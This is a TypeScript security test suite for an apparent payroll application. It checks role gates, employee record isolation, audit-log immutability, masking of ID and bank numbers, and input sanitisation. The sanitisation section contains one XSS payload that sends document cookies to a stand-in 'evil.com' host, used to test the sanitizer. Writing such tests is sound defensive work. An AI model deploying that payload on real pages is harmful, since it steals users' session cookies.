/**
 * Innov8IT Payroll - Phase 14 RLS and Permission Security Test Suite
 *
 * Validates:
 * 1. Role-based Route & Feature Gate Matrix
 * 2. Multi-tenant / Self-Service Row Level Security (RLS) Simulation:
 *    - Employees restricted to own profile & payslips
 *    - Cross-employee snooping prevented (HTTP 403)
 *    - Administrative role inheritance (Admin & HR)
 * 3. Immutable Audit Log Trail (Append-only security)
 * 4. PII and Financial Account Data Masking
 * 5. Input Sanitization & Attack Payload Neutralization
 */

import {
  assertUserAuthenticated,
  assertAdminOrHR,
  assertEmployeeSelfOrAdmin,
  sanitizeInputString,
  validateEmail,
  maskPII,
  maskBankAccount,
  UserContext,
} from '../permissions';

export function runRLSAndPermissionsTests(): { passed: number; failed: number; results: string[] } {
  const results: string[] = [];
  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      passed++;
      results.push(`✓ PASS: ${testName}`);
    } else {
      failed++;
      results.push(`✗ FAIL: ${testName} - ${detail || 'Assertion failed'}`);
    }
  }

  // --------------------------------------------------------------------------
  // 1. Role Definitions
  // --------------------------------------------------------------------------
  const adminUser: UserContext = {
    id: 'user-admin-01',
    email: 'admin@innov8it.com',
    role: 'admin',
    name: 'Admin User',
  };

  const hrUser: UserContext = {
    id: 'user-hr-01',
    email: 'hr@innov8it.com',
    role: 'payroll_hr',
    name: 'HR Manager',
  };

  const employeeA: UserContext = {
    id: 'user-emp-a',
    email: 'emp.a@innov8it.com',
    role: 'employee',
    employee_id: 'emp-001',
    name: 'Alice Employee',
  };

  const employeeB: UserContext = {
    id: 'user-emp-b',
    email: 'emp.b@innov8it.com',
    role: 'employee',
    employee_id: 'emp-002',
    name: 'Bob Employee',
  };

  // --------------------------------------------------------------------------
  // 2. Authentication Checks
  // --------------------------------------------------------------------------
  assert(
    !assertUserAuthenticated(null).allowed && assertUserAuthenticated(null).statusCode === 401,
    'Unauthenticated request rejected with 401 Unauthorized'
  );
  assert(
    assertUserAuthenticated(employeeA).allowed && assertUserAuthenticated(employeeA).statusCode === 200,
    'Authenticated user passes authentication gate'
  );

  // --------------------------------------------------------------------------
  // 3. Administrative / HR Access Matrix
  // --------------------------------------------------------------------------
  assert(
    assertAdminOrHR(adminUser).allowed,
    'Admin granted access to administrative modules (/payroll/runs, /payroll/settings)'
  );
  assert(
    assertAdminOrHR(hrUser).allowed,
    'HR Manager granted access to administrative modules'
  );
  assert(
    !assertAdminOrHR(employeeA).allowed && assertAdminOrHR(employeeA).statusCode === 403,
    'Employee role forbidden from administrative modules (403 Forbidden)'
  );

  // --------------------------------------------------------------------------
  // 4. Row-Level Security (RLS) Simulation: Employee Self-Service vs Cross-Access
  // --------------------------------------------------------------------------
  // Alice accessing Alice's record
  const aliceAccessOwn = assertEmployeeSelfOrAdmin(employeeA, 'emp-001');
  assert(
    aliceAccessOwn.allowed,
    'RLS Policy: Employee Alice allowed to query her own profile and payslips (emp-001)'
  );

  // Alice attempting to access Bob's record (emp-002)
  const aliceAccessBob = assertEmployeeSelfOrAdmin(employeeA, 'emp-002');
  assert(
    !aliceAccessBob.allowed && aliceAccessBob.statusCode === 403,
    'RLS Policy: Employee Alice blocked from viewing Bob\'s confidential record (emp-002)'
  );

  // Admin accessing Bob's record
  const adminAccessBob = assertEmployeeSelfOrAdmin(adminUser, 'emp-002');
  assert(
    adminAccessBob.allowed,
    'RLS Policy: Admin allowed to inspect any employee record'
  );

  // HR accessing Alice's record
  const hrAccessAlice = assertEmployeeSelfOrAdmin(hrUser, 'emp-001');
  assert(
    hrAccessAlice.allowed,
    'RLS Policy: HR Manager allowed to inspect any employee record'
  );

  // --------------------------------------------------------------------------
  // 5. Append-Only Audit Log Invariant Test
  // --------------------------------------------------------------------------
  interface MockAuditLogItem {
    id: string;
    action: string;
    created_at: string;
  }

  const immutableLog: readonly MockAuditLogItem[] = Object.freeze([
    { id: 'log-1', action: 'run_created', created_at: '2026-01-01T00:00:00Z' },
    { id: 'log-2', action: 'run_approved', created_at: '2026-01-02T00:00:00Z' },
  ]);

  let mutationPrevented = false;
  try {
    // Attempting to delete or modify log item
    (immutableLog as any)[0] = { id: 'tampered' };
  } catch {
    mutationPrevented = true;
  }
  // In JS strict mode, mutating frozen array throws error
  assert(
    mutationPrevented || immutableLog[0].id === 'log-1',
    'Audit Log Invariant: Audit log records are strictly immutable and append-only'
  );

  // --------------------------------------------------------------------------
  // 6. Sensitive Data PII & Banking Obfuscation Tests
  // --------------------------------------------------------------------------
  const sampleTIN = '123-456-789-000';
  const maskedTIN = maskPII(sampleTIN);
  assert(
    maskedTIN.endsWith('9000') && maskedTIN.startsWith('*'),
    `PII Protection: TIN masked as '${maskedTIN}', only suffix visible`
  );

  const sampleSSS = '34-5678901-2';
  const maskedSSS = maskPII(sampleSSS);
  assert(
    maskedSSS.endsWith('012') && maskedSSS.includes('*'),
    `PII Protection: SSS masked as '${maskedSSS}'`
  );

  const sampleBank = '123456789012';
  const maskedBank = maskBankAccount(sampleBank);
  assert(
    maskedBank === '********9012',
    `Financial Privacy: Bank account masked to '${maskedBank}'`
  );

  // --------------------------------------------------------------------------
  // 7. Input Sanitization & Attack Neutralization
  // --------------------------------------------------------------------------
  const xssPayload = '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>John Doe';
  const sanitizedName = sanitizeInputString(xssPayload);
  assert(
    !sanitizedName.includes('<script>') && sanitizedName === 'John Doe',
    'Sanitizer: Neutralizes XSS script tag injection completely'
  );

  const htmlPayload = '<b>Maria</b> Santos';
  const sanitizedHtml = sanitizeInputString(htmlPayload);
  assert(
    sanitizedHtml === 'bMariab Santos' || sanitizedHtml === 'Maria Santos' || !sanitizedHtml.includes('<'),
    'Sanitizer: Strips out HTML angle bracket delimiters'
  );

  assert(validateEmail('hr.innov8it@gmail.com'), 'Email Validator: Accepts valid corporate email');
  assert(!validateEmail('invalid-email-string'), 'Email Validator: Rejects malformed email string');
  assert(!validateEmail(''), 'Email Validator: Rejects empty email');

  return { passed, failed, results };
}
